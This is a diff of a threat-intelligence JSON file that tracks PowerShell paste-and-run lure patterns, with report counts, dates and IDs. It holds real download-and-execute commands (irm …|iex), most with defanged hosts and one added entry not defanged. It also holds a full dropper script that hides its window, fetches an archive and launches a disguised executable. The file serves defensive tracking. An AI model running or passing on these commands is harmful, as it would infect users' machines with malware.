@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 44,
-    "ReportCount": 44,
+    "DistinctPayloadCount": 45,
+    "ReportCount": 45,
     "FirstSeen": "2026-11-22T00:10:10.523000+00:00",
-    "LastSeen": "2026-11-26T16:00:18.255000+00:00",
+    "LastSeen": "2026-11-28T19:23:19.481000+00:00",
     "ReportIds": [
       "cmwr2ypwb29gj0omlf48po5rs",
       "cmwr3jq8o2aa40oml2lcavt5m",
@@ -49,7 +49,8 @@
       "cmwx5xlvf0dhd0omlllskz3uu",
       "cmwx9xrcu0dyy0omlur2m2nt0",
       "cmwxoyrm40fd70oml5xlrq4dq",
-      "cmwxqo0010fn10omlohd8wq8e"
+      "cmwxqo0010fn10omlohd8wq8e",
+      "cmx0sssfd00140omljarrrimh"
     ],
     "PayloadExamples": [
       "irm 'browse-login[.]info/083af9e16202853f'|iex;",
@@ -68,6 +69,7 @@
       "irm 'browse-login[.]info/eaa84dd940b7e8af'|iex;",
       "irm 'browse-login[.]info/edef55d135d02fe5'|iex;",
       "irm 'browse-login[.]info/eeab68657283de12'|iex;",
+      "irm 'codes-veri.beer/7df373e3e15b5f53'|iex;",
       "irm 'img-codes-cloude[.]info/0c422f1bf6150bfd'|iex;",
       "irm 'img-codes-cloude[.]info/10fb6db048d0ef86'|iex;",
       "irm 'img-codes-cloude[.]info/2a045945bf71a565'|iex;",
@@ -374,11 +376,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 13,
-    "FirstSeen": "2026-11-21T19:21:46.825000+00:00",
+    "ReportCount": 12,
+    "FirstSeen": "2026-11-21T23:25:34.994000+00:00",
     "LastSeen": "2026-11-22T10:45:15.619000+00:00",
     "ReportIds": [
-      "cmwqsnua328lm0omlqomd3emx",
       "cmwr1ddfx28u30oml4qgsvp8u",
       "cmwr1e0hk28uo0omlsv4p1gom",
       "cmwr7pgt22e9o0omlvwxnrtf0",
